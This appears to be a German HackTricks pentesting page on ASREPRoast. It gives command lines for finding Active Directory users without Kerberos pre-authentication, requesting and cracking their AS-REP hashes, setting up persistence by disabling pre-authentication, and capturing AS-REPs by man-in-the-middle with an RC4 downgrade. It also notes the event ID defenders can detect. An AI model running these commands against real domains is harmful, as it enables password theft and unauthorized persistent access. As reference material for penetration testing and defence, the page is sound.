# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, die das **Kerberos-Vorab-Authentifizierungsattribut** nicht haben. Im Wesentlichen ermöglicht diese Schwachstelle Angreifern, die Authentifizierung für einen Benutzer vom Domain Controller (DC) anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist, den Angreifer offline zu knacken versuchen können, um das Passwort des Benutzers zu entdecken.

Die Hauptanforderungen für diesen Angriff sind:

- **Fehlende Kerberos-Vorab-Authentifizierung**: Zielbenutzer dürfen diese Sicherheitsfunktion nicht aktiviert haben.
- **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optionales Domänenkonto**: Ein Domänenkonto ermöglicht es Angreifern, anfällige Benutzer effizienter durch LDAP-Abfragen zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.

#### Auflisten anfälliger Benutzer (benötigen Domänenanmeldeinformationen)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Anfrage AS_REP-Nachricht
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting mit Rubeus wird eine 4768 mit einem Verschlüsselungstyp von 0x17 und einem Preauth-Typ von 0 erzeugen.

### Knacken
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenz

Zwingen Sie **preauth**, das für einen Benutzer, bei dem Sie **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) haben, nicht erforderlich ist:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast ohne Anmeldeinformationen

Ein Angreifer kann eine Man-in-the-Middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchqueren, ohne sich auf die Deaktivierung der Kerberos-Vorautorisierung zu verlassen. Es funktioniert daher für alle Benutzer im VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht uns dies. Darüber hinaus zwingt das Tool Client-Workstations, RC4 zu verwenden, indem es die Kerberos-Verhandlung ändert.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
